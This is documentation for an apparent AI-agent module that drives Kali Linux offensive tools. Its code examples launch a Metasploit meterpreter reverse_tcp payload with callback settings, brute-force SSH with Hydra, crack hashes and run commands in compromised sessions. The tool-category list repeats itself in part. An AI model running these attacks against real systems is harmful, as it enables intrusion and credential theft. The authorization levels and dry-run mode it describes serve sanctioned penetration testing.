# KaliAgent - Kali Linux Tool Orchestration

## Overview

**KaliAgent** provides comprehensive integration with Kali Linux penetration testing tools, including Metasploit Framework, Nmap, Burp Suite, SQLMap, Hashcat, and 600+ other tools.

### Key Features

- **40+ Kali Tools** - Full tool database with categorized access (expandable to 600+)
- **Metasploit RPC** - Direct integration with Metasploit Framework
- **Safety Gates** - Authorization levels, IP whitelist/blacklist, target validation
- **Audit Logging** - JSONL audit trail for all executions
- **Automated Reporting** - Markdown and JSON report generation
- **Output Parsing** - Built-in parsers for Nmap, Nikto, SQLMap, Gobuster, JSON, CSV
- **Dry-Run Mode** - Test commands without execution
- **Job Management** - Concurrent execution with limits
- **Pre-built Methods** - Convenience methods for common tools

---

## Installation

```bash
# Ensure Kali Linux tools are installed
sudo apt update
sudo apt install -y kali-linux-default metasploit-framework

# Python dependencies
pip install requests
```

---

## Quick Start

```python
from agentic_ai.agents.cyber import KaliAgent, AuthorizationLevel, ToolCategory

# Initialize agent
agent = KaliAgent(
    workspace="/tmp/kali-workspace",
    log_dir="/tmp/kali-logs"
)

# Set authorization (required for tool execution)
agent.set_authorization(AuthorizationLevel.BASIC)

# Enable dry-run mode (safe testing)
agent.enable_dry_run()

# Execute Nmap scan
result = agent.nmap_scan(
    target="scanme.nmap.org",
    ports="1-1000",
    version_detect=True
)

print(f"Status: {result.status}")
print(f"Command: {result.command}")
print(f"Output: {result.stdout}")

# Disable dry-run for real execution
agent.disable_dry_run()
```

---

## Safety Controls

KaliAgent includes comprehensive safety features for production use:

### Authorization Levels
```python
# Set authorization
agent.set_authorization(AuthorizationLevel.BASIC)

# Check authorization
authorized, msg = agent.check_authorization("nmap")
```

### IP Whitelist/Blacklist
```python
# Only allow specific targets
agent.set_ip_whitelist(["192.0.2.0/24", "198.51.100.100"])

# Always block specific targets
agent.add_to_blacklist("192.0.2.1")  # Gateway
agent.add_to_blacklist("8.8.8.8")  # External

# Validate target manually
valid, msg = agent.validate_target("192.0.2.50")
```

### Audit Logging
```python
# Enable audit logging (JSONL format)
agent.enable_audit_logging("/var/log/kali-audit.jsonl")

# Each execution logged with:
# - timestamp, tool, command, arguments
# - exit code, duration, engagement_id
# - target validation results
```

### Dry-Run Mode
```python
# Test without execution
agent.enable_dry_run()
result = agent.nmap_scan("target.com")
print(result.stdout)  # "[DRY-RUN] Command would execute: nmap ..."
agent.disable_dry_run()
```

### Safe Mode
```python
# Read-only operations
agent.enable_safe_mode()
agent.disable_safe_mode()  # Allows system changes
```

---

## Available Tools by Category

### Reconnaissance (8 tools)
- **nmap** - Network exploration and security auditing
- **masscan** - Fastest port scanner
- **recon-ng** - Web reconnaissance framework
- **theHarvester** - Email, subdomain harvesting
- **amass** - In-depth attack surface mapping
- **subfinder** - Subdomain discovery tool
- **dnsrecon** - DNS enumeration tool
- **shodan** - IoT search engine

### Web Application (9 tools)
- **sqlmap** - SQL injection tool
- **burpsuite** - Web application security testing
- **nikto** - Web server scanner
- **dirb** - Web content scanner
- **gobuster** - Directory/DNS brute-forcer
- **wpscan** - WordPress security scanner
- **ffuf** - Fast web fuzzer
- **joomscan** - Joomla vulnerability scanner
- **zap_cli** - OWASP ZAP CLI

### Vulnerability Analysis (2 tools)
- **nikto** - Web server scanner
- **openvas** - Vulnerability scanner

### Password Attacks (6 tools)
- **john** - John the Ripper password cracker
- **hashcat** - Advanced password recovery
- **hydra** - Network login cracker
- **medusa** - Parallel brute forcer
- **cewl** - Custom wordlist generator
- **crunch** - Wordlist generator

### Wireless (4 tools)
- **aircrack-ng** - WiFi security auditing
- **reaver** - WPS brute force attack
- **wifite** - Automated wireless auditor
- **kismet** - Wireless network detector

### Exploitation (2 tools)
- **metasploit** - Metasploit Framework
- **searchsploit** - Exploit database search

### Post-Exploitation (3 tools)
- **mimikatz** - Credential extraction
- **bloodhound** - Active Directory reconnaissance
- **empire** - Post-exploitation framework

### Sniffing & Spoofing (2 tools)
- **wireshark/tshark** - Network protocol analyzer
- **responder** - LLMNR, NBT-NS poisoner

### Forensics (3 tools)
- **volatility** - Memory forensics
- **foremost** - File recovery tool
- **sleuthkit** - Forensic toolkit

### Social Engineering (1 tool)
- **setoolkit** - Social Engineering Toolkit

### Malware Analysis (1 tool)
- **binwalk** - Firmware analysis tool
- **nikto** - Web server scanner
- **openvas** - Full vulnerability scanner
- **nessus** - Commercial vulnerability scanner

### Web Application
- **sqlmap** - SQL injection automation
- **burpsuite** - Web app security testing
- **dirb** - Web content scanner
- **gobuster** - Directory/DNS brute-forcer
- **wpscan** - WordPress scanner

### Password Attacks
- **john** - John the Ripper password cracker
- **hashcat** - GPU-accelerated password recovery
- **hydra** - Network login cracker
- **medusa** - Parallel brute forcer
- **crunch** - Wordlist generator

### Exploitation
- **metasploit** - Metasploit Framework
- **searchsploit** - Exploit database search
- **beef** - Browser exploitation framework

### Wireless
- **aircrack-ng** - WiFi security auditing
- **reaver** - WPS brute forcer
- **wifite** - Automated WiFi auditor

### Sniffing/Spoofing
- **wireshark** (tshark) - Network protocol analyzer
- **responder** - LLMNR/NBT-NS poisoner
- **bettercap** - Swiss army knife for network attacks

### Post Exploitation
- **mimikatz** - Credential extraction
- **bloodhound** - Active Directory analysis
- **empire** - Post-exploitation framework

### Forensics
- **volatility** - Memory forensics
- **autopsy** - Digital forensics platform
- **sleuthkit** - File system analysis

---

## Metasploit Integration

### Connect to Metasploit RPC

```python
# Start Metasploit RPC
# msfrpcd -P password -S -a 127.0.0.1

# Connect from KaliAgent
agent.connect_metasploit(
    host="127.0.0.1",
    port=55553,
    password="password"
)

# Get available exploit modules
modules = agent.get_metasploit_modules()
for module in modules[:10]:
    print(f"  {module['path']} (rank: {module['rank']})")

# Execute an exploit
job = agent.execute_metasploit_exploit(
    exploit="exploit/multi/handler",
    payload="payload/meterpreter/reverse_tcp",
    target="192.0.2.100",
    options={
        "LHOST": "192.0.2.50",
        "LPORT": 4444,
    }
)

print(f"Job started: {job.job_id}")

# Get active sessions
sessions = agent.get_metasploit_sessions()
for session in sessions:
    print(f"  Session {session.session_id}: {session.target_host}:{session.target_port}")
    print(f"    Type: {session.type}, Payload: {session.payload}")

# Execute command in session
output = agent.metasploit_session_command(
    session_id="1",
    command="sysinfo"
)
print(output)

# Disconnect
agent.disconnect_metasploit()
```

### Metasploit Session Object

```python
@dataclass
class MetasploitSession:
    session_id: str
    type: str  # meterpreter, shell, etc.
    target_host: str
    target_port: int
    exploit_used: str
    payload: str
    opened_at: datetime
    last_activity: datetime
    user_context: Optional[str]
    system_info: Optional[Dict[str, Any]]
```

---

## Tool Execution

### Basic Execution

```python
# Execute any tool by name
result = agent.execute_tool(
    tool_name="nmap",
    arguments={
        "target": "192.0.2.0/24",
        "ports": "1-65535",
        "version_detect": True,
        "os_detect": True,
    },
    timeout_override=900  # Override default timeout
)

print(f"Status: {result.status}")
print(f"Exit code: {result.exit_code}")
print(f"Duration: {result.duration_seconds:.2f}s")
print(f"Output file: {result.output_file}")
```

### Pre-built Methods

```python
# Nmap scan
result = agent.nmap_scan(
    target="scanme.nmap.org",
    ports="1-1000",
    version_detect=True,
    os_detect=False
)

# Nikto web scan
result = agent.nikto_scan(
    host="example.com",
    port=443,
    ssl=True
)

# SQLMap scan
result = agent.sqlmap_scan(
    url="http://example.com/page?id=1",
    level=3,
    risk=2
)

# Searchsploit
result = agent.searchsploit_search(
    query="Apache Struts",
    exact=True
)

# John the Ripper
result = agent.john_crack(
    hash_file="/tmp/hashes.txt",
    wordlist="/usr/share/wordlists/rockyou.txt"
)

# Hydra brute force
result = agent.hydra_bruteforce(
    target="192.0.2.100",
    service="ssh",
    userlist="/tmp/users.txt",
    passlist="/tmp/passwords.txt"
)
```

### Tool Execution Result

```python
@dataclass
class ToolExecution:
    execution_id: str
    tool_name: str
    command: str
    arguments: Dict[str, Any]
    status: str  # pending, running, completed, failed, timeout
    exit_code: Optional[int]
    stdout: str
    stderr: str
    output_file: Optional[str]
    started_at: datetime
    completed_at: Optional[datetime]
    duration_seconds: float
    authorization_level: AuthorizationLevel
    executed_by: Optional[str]
    engagement_id: Optional[str]
```

---

## Safety Controls

### Safe Mode

```python
# Enable safe mode (read-only operations)
agent.enable_safe_mode()

# Disable safe mode (allows system changes)
agent.disable_safe_mode()
```

### Dry-Run Mode

```python
# Enable dry-run (commands logged but not executed)
agent.enable_dry_run()

result = agent.nmap_scan(target="192.0.2.1")
print(result.stdout)  # "[DRY-RUN] Command would execute: nmap ..."

# Disable dry-run
agent.disable_dry_run()
```

### Concurrent Job Limits

```python
# Set maximum concurrent jobs
agent.max_concurrent_jobs = 10

# Check current job count
print(f"Running jobs: {agent.current_jobs}")
```

---

## Reporting

### Execution History

```python
# Get all executions
history = agent.get_execution_history()

# Filter by engagement
history = agent.get_execution_history(engagement_id="eng_123")

# Filter by tool
history = agent.get_execution_history(tool_name="nmap")

# Filter by status
history = agent.get_execution_history(status="failed")
```

### Generate Reports

```python
# Markdown report
report = agent.generate_report(
    engagement_id="eng_123",
    output_format="markdown"
)
print(report)

# JSON report
report_json = agent.generate_report(
    output_format="json"
)
import json
data = json.loads(report_json)
```

### Sample Markdown Report

```markdown
# Kali Agent Execution Report

Generated: 2026-04-17T20:30:00

Total Executions: 15

## Summary

| Tool | Status | Duration | Time |
|------|--------|----------|------|
| nmap | ✅ completed | 45.2s | 20:25:00 |
| nikto | ✅ completed | 120.5s | 20:26:00 |
| sqlmap | ❌ failed | 5.3s | 20:28:00 |

## Failed Executions

### sqlmap (exec_abc123)
- Command: `sqlmap --url 'http://example.com/page?id=1'`
- Error: Connection timeout
```

---

## Output Parsers

### Nmap XML Parser

```python
# Execute Nmap with XML output
result = agent.execute_tool("nmap", {
    "target": "192.0.2.0/24",
    "output_xml": "/tmp/scan.xml"
})

# Parse output
parsed = agent._parse_nmap_xml(result.stdout)

# Result structure
{
    "hosts": [
        {
            "address": "192.0.2.1",
            "hostname": "gateway.local",
            "ports": [
                {"port": 22, "protocol": "tcp", "state": "open", "service": "ssh"},
                {"port": 80, "protocol": "tcp", "state": "open", "service": "http"}
            ],
            "os": "Linux 4.15 - 5.6"
        }
    ],
    "scan_time": "2026-04-17T20:30:00"
}
```

### JSON Parser

```python
parsed = agent._parse_json(result.stdout)
```

### CSV Parser

```python
parsed = agent._parse_csv(result.stdout)
# Returns: List[Dict[str, Any]]
```

---

## Integration with RedTeam Agent

```python
from agentic_ai.agents.cyber import RedTeamAgent, KaliAgent, EngagementType

# Initialize both agents
redteam = RedTeamAgent()
kali = KaliAgent()

# Create engagement
engagement = redteam.create_engagement(
    name="External Penetration Test",
    engagement_type=EngagementType.PENETRATION_TEST,
    start_date=datetime.utcnow(),
    scope=["192.0.2.0/24"],
    objectives=["Identify vulnerabilities", "Test defenses"]
)

# Set authorization for Kali
kali.set_authorization(AuthorizationLevel.ADVANCED)

# Execute reconnaissance
kali.enable_dry_run()
nmap_result = kali.nmap_scan(
    target="192.0.2.0/24",
    ports="1-65535"
)
kali.disable_dry_run()

# Add targets from scan results
# (Parse Nmap output and add to RedTeam engagement)

# Execute exploitation
kali.set_authorization(AuthorizationLevel.CRITICAL)
metasploit_job = kali.execute_metasploit_exploit(
    exploit="exploit/multi/handler",
    payload="payload/meterpreter/reverse_tcp",
    target="192.0.2.100"
)

# Add finding from Metasploit session
redteam.add_finding(
    title="Remote Code Execution via Metasploit",
    description="Successfully gained shell access",
    severity=FindingSeverity.CRITICAL,
    engagement_id=engagement.engagement_id,
    mitre_attack=["T1059", "T1078"]
)

# Generate combined report
kali_report = kali.generate_report(engagement_id=engagement.engagement_id)
```

---

## Best Practices

### 1. Always Set Authorization

```python
# ❌ Wrong - No authorization
result = agent.execute_tool("nmap", {"target": "192.0.2.1"})

# ✅ Correct - Set appropriate level
agent.set_authorization(AuthorizationLevel.BASIC)
result = agent.execute_tool("nmap", {"target": "192.0.2.1"})
```

### 2. Use Dry-Run for Testing

```python
# Test commands before real execution
agent.enable_dry_run()
result = agent.execute_tool("metasploit", {...})
print(f"Would execute: {result.command}")
agent.disable_dry_run()
```

### 3. Review Execution History

```python
# Regular review of executed commands
history = agent.get_execution_history()
for exec_record in history:
    if exec_record.status == "failed":
        print(f"Failed: {exec_record.tool_name} - {exec_record.stderr}")
```

### 4. Use Engagement IDs for Tracking

```python
# Track all executions for a specific engagement
executions = agent.get_execution_history(engagement_id="eng_123")
report = agent.generate_report(engagement_id="eng_123")
```

### 5. Implement Proper Logging

```python
import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("kali_agent")

# All tool executions are logged
logger.info(f"Executing: {result.command}")
```

---

## Troubleshooting

### Tool Not Found

```
Error: Unknown tool: toolname
```

**Solution:** Check tool name in `KALI_TOOLS_DB`. Tool names use underscores, not hyphens (e.g., `aircrack_ng` not `aircrack-ng`).

### Authorization Failed

```
Error: Authorization level critical required, have basic
```

**Solution:** Set appropriate authorization level:
```python
agent.set_authorization(AuthorizationLevel.CRITICAL)
```

### Metasploit Connection Failed

```
Error: Metasploit login failed
```

**Solution:** 
1. Start Metasploit RPC: `msfrpcd -P password -S -a 127.0.0.1`
2. Verify port: `netstat -tlnp | grep 55553`
3. Check firewall rules

### Command Timeout

```
Error: Command timed out after 300 seconds
```

**Solution:** Increase timeout:
```python
result = agent.execute_tool("nmap", {...}, timeout_override=900)
```

---

## Security Considerations

⚠️ **WARNING:** KaliAgent provides access to powerful offensive security tools. Use responsibly:

1. **Authorization Required** - Only execute tools with proper written authorization
2. **Legal Compliance** - Ensure all testing complies with local laws and regulations
3. **Scope Limitation** - Only test systems you own or have explicit permission to test
4. **Audit Trail** - All executions are logged for accountability
5. **Safe Mode** - Use safe mode and dry-run when possible

---

## API Reference

### KaliAgent Class

| Method | Description |
|--------|-------------|
| `__init__(workspace, log_dir)` | Initialize agent |
| `set_authorization(level, engagement_id, expires_at)` | Set auth level |
| `revoke_authorization(engagement_id)` | Revoke auth |
| `check_authorization(tool_name)` | Check if tool authorized |
| `enable_safe_mode()` | Enable read-only mode |
| `disable_safe_mode()` | Allow system changes |
| `enable_dry_run()` | Log commands without executing |
| `disable_dry_run()` | Execute real commands |
| `execute_tool(tool_name, arguments, engagement_id, timeout_override)` | Execute tool |
| `nmap_scan(target, ports, version_detect, os_detect, output_xml)` | Nmap scan |
| `nikto_scan(host, port, ssl)` | Nikto scan |
| `sqlmap_scan(url, level, risk)` | SQLMap scan |
| `searchsploit_search(query, exact)` | Search exploits |
| `john_crack(hash_file, wordlist)` | Crack passwords |
| `hydra_bruteforce(target, service, userlist, passlist)` | Brute force |
| `connect_metasploit(host, port, password)` | Connect to MSF RPC |
| `disconnect_metasploit()` | Disconnect from MSF |
| `get_metasploit_modules(module_type)` | List MSF modules |
| `execute_metasploit_exploit(exploit, payload, target, options)` | Run exploit |
| `get_metasploit_sessions()` | Get active sessions |
| `metasploit_session_command(session_id, command)` | Session command |
| `get_execution_history(engagement_id, tool_name, status)` | Get history |
| `generate_report(engagement_id, output_format)` | Generate report |
| `list_tools(category)` | List available tools |
| `get_tool_info(tool_name)` | Get tool details |

---

*Generated: April 17, 2026*
*Agentic AI v1.0.0*
